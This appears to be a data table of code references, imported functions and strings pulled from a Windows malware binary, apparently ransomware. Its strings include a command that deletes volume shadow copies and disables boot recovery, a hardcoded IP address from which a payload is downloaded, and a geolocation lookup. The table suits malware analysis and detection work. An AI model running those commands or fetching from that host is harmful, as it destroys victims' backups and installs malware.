reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4018be	0x403050	import	0x4015d0	KERNEL32.dll.FindClose
0x40196f	0x40313c	import	0x4018f0	USER32.dll.wsprintfW
0x40197f	0x403040	import	0x4018f0	KERNEL32.dll.SetCurrentDirectoryW
0x4019e0	0x403038	import	0x4019b0	KERNEL32.dll.ExpandEnvironmentStringsW
0x4019e6	0x404090	string	0x4019b0	\6356356356.txt
0x401a01	0x40312c	import	0x4019b0	SHLWAPI.dll.PathFileExistsW
0x401a27	0x4030b0	import	0x4019b0	KERNEL32.dll.CreateFileW
0x401a43	0x40309c	import	0x4019b0	KERNEL32.dll.CloseHandle
0x401a68	0x4040b0	string	0x401a50	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
0x401a6d	0x403154	import	0x401a50	WININET.dll.InternetOpenA
0x401a8e	0x404100	string	0x401a50	http://api.wipmania.com/
0x401a9a	0x403150	import	0x401a50	WININET.dll.InternetOpenUrlA
0x401ae3	0x40314c	import	0x401a50	WININET.dll.InternetReadFile
0x401bfb	0x403158	import	0x401a50	WININET.dll.InternetCloseHandle
0x401c08	0x403158	import	0x401a50	WININET.dll.InternetCloseHandle
0x401c8b	0x403140	import	0x401c40	USER32.dll.CharLowerA
0x401cb3	0x40302c	import	0x401c40	KERNEL32.dll.OpenProcess
0x401cd1	0x403030	import	0x401c40	KERNEL32.dll.TerminateProcess
0x401cde	0x40309c	import	0x401c40	KERNEL32.dll.CloseHandle
0x401d09	0x40309c	import	0x401c40	KERNEL32.dll.CloseHandle
0x401d56	0x403078	import	0x401d20	KERNEL32.dll.Sleep
0x401d60	0x403074	import	0x401d20	KERNEL32.dll.ExitProcess
0x401d7e	0x403078	import	0x401d70	KERNEL32.dll.Sleep
0x401d84	0x404140	string	0x401d70	KNOT
0x401d8d	0x403088	import	0x401d70	KERNEL32.dll.CreateMutexA
0x401d96	0x403084	import	0x401d70	KERNEL32.dll.GetLastError
0x401da5	0x403074	import	0x401d70	KERNEL32.dll.ExitProcess
0x401dc0	0x403078	import	0x401d70	KERNEL32.dll.Sleep
0x401dd7	0x403080	import	0x401d70	KERNEL32.dll.GetTickCount
0x401df2	0x404148	string	0x401d70	%temp%
0x401df7	0x403038	import	0x401d70	KERNEL32.dll.ExpandEnvironmentStringsW
0x401e18	0x404158	string	0x401d70	%s\%d.jpg
0x401e24	0x40313c	import	0x401d70	USER32.dll.wsprintfW
0x401e38	0x40416c	string	0x401d70	http://45.182.189.251/k
0x401e5c	0x403020	import	0x401d70	ADVAPI32.dll.CryptAcquireContextW
0x401e96	0x40307c	import	0x401d70	KERNEL32.dll.CreateThread
0x401ea0	0x403160	import	0x401d70	ole32.dll.CoInitializeEx
0x401f1f	0x403040	import	0x401d70	KERNEL32.dll.SetCurrentDirectoryW
0x401f47	0x40306c	import	0x401d70	KERNEL32.dll.DeleteFileW
0x401f4d	0x4041a0	string	0x401d70	/c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures
0x401f59	0x403138	import	0x401d70	USER32.dll.wsprintfA
0x401f72	0x404234	string	0x401d70	open
0x401f79	0x403120	import	0x401d70	SHELL32.dll.ShellExecuteA
0x401f88	0x4030b8	import	0x401f88	MSVCRT.dll.memcpy
0x401f8e	0x403118	import	0x401f8e	MSVCRT.dll.fclose
0x401f94	0x403114	import	0x401f94	MSVCRT.dll.fwprintf
0x401f9a	0x403110	import	0x401f9a	MSVCRT.dll._wfopen
0x401fa0	0x40310c	import	0x401fa0	MSVCRT.dll.wcscpy
0x401fa6	0x403108	import	0x401fa6	MSVCRT.dll.wcsstr
0x401fac	0x403104	import	0x401fac	MSVCRT.dll.wcscat
0x401fb2	0x403100	import	0x401fb2	MSVCRT.dll.memset
0x401fb8	0x4030fc	import	0x401fb8	MSVCRT.dll.strcmp
0x401fbe	0x4030f8	import	0x401fbe	MSVCRT.dll.strchr
0x401fc4	0x4030f4	import	0x401fc4	MSVCRT.dll.rand
0x401fca	0x4030f0	import	0x401fca	MSVCRT.dll.srand
0x401ffe	0x4030c4	import	0x401fd1	MSVCRT.dll.__set_app_type
0x402013	0x4030c8	import	0x401fd1	MSVCRT.dll.__p__fmode
0x402021	0x4030cc	import	0x401fd1	MSVCRT.dll.__p__commode
0x40204d	0x4030d4	import	0x401fd1	MSVCRT.dll.__setusermatherr
0x402086	0x4030dc	import	0x401fd1	MSVCRT.dll.__getmainargs
0x4020d5	0x403090	import	0x401fd1	KERNEL32.dll.GetStartupInfoA
0x4020df	0x4020f2	string	0x401fd1	j\nXPVSS
0x4020f9	0x40308c	import	0x401fd1	KERNEL32.dll.GetModuleHandleA
0x402109	0x4030e4	import	0x401fd1	MSVCRT.dll.exit
0x402130	0x4030e8	import	0x402130	MSVCRT.dll._XcptFilter
0x402136	0x4030d8	import	0x402136	MSVCRT.dll._initterm
0x402166	0x4030bc	import	0x402166	MSVCRT.dll._controlfp
0x40216c	0x403168	import	0x40216c	urlmon.dll.URLDownloadToFileW
0x402172	0x403034	import	0x402172	KERNEL32.dll.Process32Next
0x402178	0x40304c	import	0x402178	KERNEL32.dll.Process32First
0x40217e	0x403070	import	0x40217e	KERNEL32.dll.CreateToolhelp32Snapshot
